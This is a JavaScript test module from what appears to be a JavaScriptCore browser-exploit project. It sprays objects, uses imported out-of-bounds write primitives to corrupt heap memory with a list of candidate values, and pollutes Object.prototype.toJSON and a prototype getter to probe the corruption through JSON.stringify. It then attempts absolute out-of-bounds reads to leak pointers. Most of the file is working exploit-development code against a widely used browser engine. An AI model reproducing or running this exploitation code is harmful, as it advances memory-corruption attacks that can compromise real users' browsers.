// js/script3/testMyComplexObjectGetterRepro.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GetterRepro";
export let getter_repro_called_flag = false;
export let getter_corruption_attempt_results = {};

// Valores a serem escritos em oob_array_buffer_real[0x70]
// Tentar adicionar IDs de estrutura conhecidos se os tiver em config.mjs
// Ex: JSC_OFFSETS.KnownStructureIDs?.JSArray_STRUCTURE_ID || 0x01080300 (exemplo)
const CORRUPTION_VALUES_TO_TEST = [
    0xFFFFFFFF,
    0x00000000,
    0x00000001,
    0x41414141,
    // Adicionar mais valores especulativos aqui, como possíveis IDs de estrutura
    // Por exemplo, se você tivesse JSC_OFFSETS.KnownStructureIDs.JSArray_STRUCTURE_ID:
    // JSC_OFFSETS.KnownStructureIDs.JSArray_STRUCTURE_ID || 0x01010101, // Substitua pelo valor real
];

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.marker = 0xCAFECAFE;
        // Alvos para observação após corrupção OOB
        this.propD_ObjectTarget = { original_prop: "valD_initial" };
        this.propE_ArrayTarget = [1000, 2000, 3000];
        this.value_slot1 = 0x11111111; // Slots numéricos para ver se são sobrescritos
        this.value_slot2 = 0x22222222;
    }
}

export function toJSON_TriggerGetterViaForIn() { // Mesma função toJSON
    const FNAME_toJSON = "toJSON_TriggerGetterViaForIn";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObject.prototype.hasOwnProperty(prop)) {
                    returned_payload[prop] = this[prop];
                }
                if (iteration_count > 100) break;
            }
        } else { returned_payload._ERROR_ = "this is not an object or is null"; }
    } catch (e) {
        if (returned_payload) returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`;
    }
    if (returned_payload && iteration_count > 0) returned_payload._iterations_ = iteration_count;
    return returned_payload;
}

export async function executeGetterTriggerReproTest() {
    const FNAME_TEST = "executeGetterTrigger_CorruptPropTest";
    logS3(`--- Iniciando Teste: Getter com Tentativa de Corromper Propriedades de 'this' ---`, "test", FNAME_TEST);
    document.title = `Repro MyComplex Getter - Corrupt Prop`;

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const bytes_to_write_oob_val = 4; // Escrevendo um DWORD

    for (const current_corruption_value of CORRUPTION_VALUES_TO_TEST) {
        logS3(`\n--- Sub-teste com Valor de Corrupção OOB: ${toHex(current_corruption_value)} ---`, "subtest", FNAME_TEST);

        getter_repro_called_flag = false;
        getter_corruption_attempt_results = {
            corruption_value_used: toHex(current_corruption_value),
            getter_called: false,
            details: "Not called or no significant change."
        };

        let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
        let getterPollutionApplied = false;

        try {
            Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
                get: function() {
                    const GETTER_FNAME = "MyComplexObject_EvilGetter_CorruptProp";
                    getter_repro_called_flag = true;
                    const results = {
                        id: this.id,
                        corruption_value_snapshot: toHex(current_corruption_value), // Captura o valor do loop externo
                        marker_before: toHex(this.marker)
                    };
                    logS3(`!!!! GETTER (CorruptProp Test) '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}, OOB Val: ${toHex(current_corruption_value)}`, "vuln", GETTER_FNAME);

                    try {
                        this.marker = 0xBAD0C0DE; // Indicar chamada
                        results.marker_after = toHex(this.marker);

                        // Inspecionar propD_ObjectTarget
                        results.propD = {};
                        results.propD.typeof = typeof this.propD_ObjectTarget;
                        results.propD.toString = Object.prototype.toString.call(this.propD_ObjectTarget);
                        results.propD.instanceof_Array = this.propD_ObjectTarget instanceof Array;
                        results.propD.instanceof_AB = this.propD_ObjectTarget instanceof ArrayBuffer;
                        try { results.propD.original_prop_val = this.propD_ObjectTarget.original_prop; } catch (e) { results.propD.original_prop_error = e.message; }
                        if (typeof this.propD_ObjectTarget === 'number') results.propD.numeric_value = toHex(this.propD_ObjectTarget);
                        logS3(`   [${GETTER_FNAME}] this.propD_ObjectTarget: typeof=${results.propD.typeof}, toString=${results.propD.toString}`, "info", GETTER_FNAME);

                        // Inspecionar propE_ArrayTarget
                        results.propE = {};
                        results.propE.typeof = typeof this.propE_ArrayTarget;
                        results.propE.toString = Object.prototype.toString.call(this.propE_ArrayTarget);
                        results.propE.instanceof_Array = this.propE_ArrayTarget instanceof Array;
                        results.propE.instanceof_AB = this.propE_ArrayTarget instanceof ArrayBuffer;
                        try { results.propE.length_prop = this.propE_ArrayTarget.length; } catch (e) { results.propE.length_error = e.message; }
                        try { results.propE.val_at_0 = this.propE_ArrayTarget[0]; } catch (e) { results.propE.val_at_0_error = e.message; }
                        if (typeof this.propE_ArrayTarget === 'number') results.propE.numeric_value = toHex(this.propE_ArrayTarget);
                        logS3(`   [${GETTER_FNAME}] this.propE_ArrayTarget: typeof=${results.propE.typeof}, toString=${results.propE.toString}, length=${results.propE.length_prop}`, "info", GETTER_FNAME);
                        
                        results.value_slot1_val = toHex(this.value_slot1);
                        results.value_slot2_val = toHex(this.value_slot2);
                        logS3(`   [${GETTER_FNAME}] value_slot1: ${results.value_slot1_val}, value_slot2: ${results.value_slot2_val}`, "info", GETTER_FNAME);


                        // Se alguma propriedade pareceu virar um ponteiro e temos oob_read_absolute
                        if ((typeof this.propD_ObjectTarget === 'number' && this.propD_ObjectTarget > 0xFFFF) ||
                            (typeof this.propE_ArrayTarget === 'number' && this.propE_ArrayTarget > 0xFFFF)) {
                            logS3(`   [${GETTER_FNAME}] Potencial ponteiro detectado! Tentando oob_read_absolute...`, "leak", GETTER_FNAME);
                            const ptr_candidate_d = (typeof this.propD_ObjectTarget === 'number') ? new AdvancedInt64(this.propD_ObjectTarget) : null;
                            const ptr_candidate_e = (typeof this.propE_ArrayTarget === 'number') ? new AdvancedInt64(this.propE_ArrayTarget) : null;
                            
                            if (ptr_candidate_d) {
                                try {
                                    const leaked_val = oob_read_absolute(ptr_candidate_d, 8);
                                    results.propD.oob_read_val = isAdvancedInt64Object(leaked_val) ? leaked_val.toString(true) : toHex(leaked_val);
                                    logS3(`     LEAK ATTEMPT via propD (${ptr_candidate_d.toString(true)}): ${results.propD.oob_read_val}`, "critical", GETTER_FNAME);
                                } catch (e_read) { results.propD.oob_read_error = e_read.message; }
                            }
                            if (ptr_candidate_e) {
                                try {
                                    const leaked_val = oob_read_absolute(ptr_candidate_e, 8);
                                    results.propE.oob_read_val = isAdvancedInt64Object(leaked_val) ? leaked_val.toString(true) : toHex(leaked_val);
                                     logS3(`     LEAK ATTEMPT via propE (${ptr_candidate_e.toString(true)}): ${results.propE.oob_read_val}`, "critical", GETTER_FNAME);
                                } catch (e_read) { results.propE.oob_read_error = e_read.message; }
                            }
                        }

                    } catch (e_getter_main) { results.getter_internal_error = e_getter_main.message; }
                    getter_corruption_attempt_results.details = results;
                    getter_corruption_attempt_results.getter_called = true;
                    return "value_from_corrupt_prop_getter";
                },
                configurable: true, enumerable: true
            });
            getterPollutionApplied = true;
        } catch (e_getter_setup) {
            logS3(`ERRO ao definir getter: ${e_getter_setup.message}`, "error", FNAME_TEST);
            continue; // Próximo valor de corrupção
        }

        const spray_count_mycomplex = 50;
        const sprayed_mycomplex_objects = [];

        for (let i = 0; i < spray_count_mycomplex; i++) sprayed_mycomplex_objects.push(new MyComplexObject(i));
        await PAUSE_S3(SHORT_PAUSE_S3); // Pausa após spray

        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { logS3("OOB setup error", "error", FNAME_TEST); continue; }

        try {
            oob_write_absolute(corruption_offset_in_oob_ab, current_corruption_value, bytes_to_write_oob_val);
        } catch (e_write) { logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST); clearOOBEnvironment(); continue; }

        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa antes de sondar

        const ppKey_val = 'toJSON';
        let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let toJSONPollutionApplied = false;
        let problem_in_current_subtest = null;

        try {
            Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_TriggerGetterViaForIn, writable: true, configurable: true, enumerable: false });
            toJSONPollutionApplied = true;

            const obj_to_probe = sprayed_mycomplex_objects[0]; // Sondar apenas o primeiro para este teste
            if (obj_to_probe) {
                getter_repro_called_flag = false; // Reset para esta sondagem
                getter_corruption_attempt_results.details = "Getter not called or no significant change for this sub-test."; // Default

                const original_marker_val = obj_to_probe.marker;
                logS3(`   Sondando MyComplexObject 0 (ID: ${obj_to_probe.id}). OOB Val: ${toHex(current_corruption_value)}`, 'info', FNAME_TEST);
                try {
                    JSON.stringify(obj_to_probe);
                } catch (e_str) {
                    logS3(`     ERRO AO STRINGIFY obj[0]: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                    problem_in_current_subtest = `${e_str.name}: ${e_str.message}`;
                }

                if (getter_repro_called_flag) {
                    logS3(`   Getter FOI CHAMADO para OOB Val: ${toHex(current_corruption_value)}. Detalhes da Sondagem:`, "vuln", FNAME_TEST);
                    logS3(JSON.stringify(getter_corruption_attempt_results.details, null, 2), "leak", FNAME_TEST);
                    if (obj_to_probe.marker === 0xBAD0C0DE) {
                         logS3(`     Marker modificado e persistiu para OOB Val: ${toHex(current_corruption_value)}`, "good", FNAME_TEST);
                    }
                } else if (problem_in_current_subtest) {
                    logS3(`   Problema (${problem_in_current_subtest}) ocorreu para OOB Val: ${toHex(current_corruption_value)} ANTES do getter ser chamado ou sem chamada.`, "warn", FNAME_TEST);
                } else {
                    logS3(`   Getter NÃO foi chamado para OOB Val: ${toHex(current_corruption_value)}.`, "info", FNAME_TEST);
                }
            }
        } catch (e_main_loop) {
            logS3(`Erro no loop de sondagem (OOB Val ${toHex(current_corruption_value)}): ${e_main_loop.message}`, "error", FNAME_TEST);
        } finally {
            if (toJSONPollutionApplied) {
                if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
                else delete Object.prototype[ppKey_val];
            }
            if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
                if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
                else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
            }
            clearOOBEnvironment(); // Limpar OOB para o próximo valor de corrupção
            sprayed_mycomplex_objects.length = 0;
            globalThis.gc?.();
            await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa maior entre os sub-testes de valores de corrupção
        }
    } // Fim do loop CORRUPTION_VALUES_TO_TEST

    logS3(`--- Teste Getter com Tentativa de Corromper Propriedades CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Corrupt Prop Test Done`;
}
